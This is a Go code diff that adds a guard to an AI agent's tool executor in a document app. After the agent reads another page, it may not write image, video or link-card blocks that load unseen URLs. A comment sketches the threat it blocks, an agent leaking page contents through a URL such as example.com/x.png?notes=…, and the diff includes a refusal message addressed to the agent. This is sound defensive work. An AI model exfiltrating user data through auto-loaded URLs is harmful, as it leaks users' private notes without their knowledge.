@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"regexp"
 	"strings"
 
 	"leaflet/internal/doc"
@@ -224,6 +225,66 @@ type Executor struct {
 	OnOp  func(op doc.Op, summary string)
 	Ops   []doc.Op
 	Edits []Edit
+	// seen are the URLs the agent has seen since it first read another
+	// page, nil before (fetchedURLs).
+	seen map[string]bool
+}
+
+// fetchedURLs are the URLs of the blocks the app loads by itself, as it
+// shows them: an image, a video, a link card. An agent that has read
+// another of the user's pages could write what it read into one, such as
+// https://example.com/x.png?notes=…, and the app would send it to that
+// server without anyone clicking. So once a run reads another page, a
+// block it writes may load only a URL it saw: one on this page then, or
+// on a page it read. Links in text are not loaded, so they stay free.
+var fetchedURLs = map[string]bool{"image": true, "video": true, "link_preview": true}
+
+// urlRe finds the URLs in text the agent read.
+var urlRe = regexp.MustCompile(`https?://[^\s<>"'()\[\]]+`)
+
+// see adds the URLs in v, what the agent read, to x.seen.
+func (x *Executor) see(v any) {
+	switch v := v.(type) {
+	case string:
+		if strings.HasPrefix(v, "http://") || strings.HasPrefix(v, "https://") {
+			x.seen[v] = true
+		}
+		for _, u := range urlRe.FindAllString(v, -1) {
+			x.seen[u] = true
+		}
+	case map[string]any:
+		for _, e := range v {
+			x.see(e)
+		}
+	case []map[string]any:
+		for _, e := range v {
+			x.see(e)
+		}
+	case []any:
+		for _, e := range v {
+			x.see(e)
+		}
+	}
+}
+
+// checkURLs refuses blocks that would load a URL the agent did not see,
+// once it has read another page.
+func (x *Executor) checkURLs(nodes []*doc.Node) error {
+	if x.seen == nil {
+		return nil
+	}
+	var bad string
+	for _, n := range nodes {
+		walk(n, func(k *doc.Node) {
+			if u := k.Str("url"); fetchedURLs[k.Type] && bad == "" && !x.seen[u] {
+				bad = u
+			}
+		})
+	}
+	if bad != "" {
+		return terr("After reading another page, an image, video or link card may only use a URL from this page or a page you read, which %s is not: the app loads it by itself. Link to it in text instead.", bad)
+	}
+	return nil
 }
 
 // CallRaw runs a tool with JSON arguments. Invalid calls return {error}
@@ -296,6 +357,11 @@ func (x *Executor) dispatch(name string, args map[string]any) (map[string]any, e
 		if p == nil {
 			return nil, terr("No page %s.", id)
 		}
+		if x.seen == nil {
+			x.seen = map[string]bool{}
+			x.see(doc.BlockViews(x.Ctx.Content))
+		}
+		x.see(p)
 		return p, nil
 	}
 	return nil, terr("Unknown tool %q.", name)
@@ -409,6 +475,9 @@ func (x *Executor) insert(args map[string]any) (map[string]any, error) {
 	if err != nil {
 		return nil, err
 	}
+	if err := x.checkURLs(nodes); err != nil {
+		return nil, err
+	}
 	var ids []string
 	for _, n := range nodes {
 		ids = append(ids, n.ID)
@@ -445,8 +514,14 @@ func (x *Executor) replace(args map[string]any) (map[string]any, error) {
 	if err != nil {
 		return nil, err
 	}
-	// A table's children are its cells, which no other type keeps.
-	if len(prev.Children) > 0 && n.Children == nil && prev.Type != "table" {
+	if err := x.checkURLs([]*doc.Node{n}); err != nil {
+		return nil, err
+	}
+	// A block written without children keeps the nested items it had, as
+	// the server's replace does. It is the spec that says so, not the
+	// node: a table's children are its cells, which no other type keeps,
+	// so a new table has children of its own and still drops the items.
+	if len(prev.Children) > 0 && spec["children"] == nil && prev.Type != "table" {
 		if doc.NestableTypes[n.Type] {
 			for _, k := range prev.Children {
 				n.Children = append(n.Children, k.Clone())
@@ -533,6 +608,9 @@ func (x *Executor) createSubpage(args map[string]any) (map[string]any, error) {
 	var nodes []*doc.Node
 	if args["blocks"] != nil {
 		if nodes, err = x.specs(args["blocks"]); err != nil {
+			return nil, err
+		}
+		if err := x.checkURLs(nodes); err != nil {
 			return nil, err
 		}
 	}
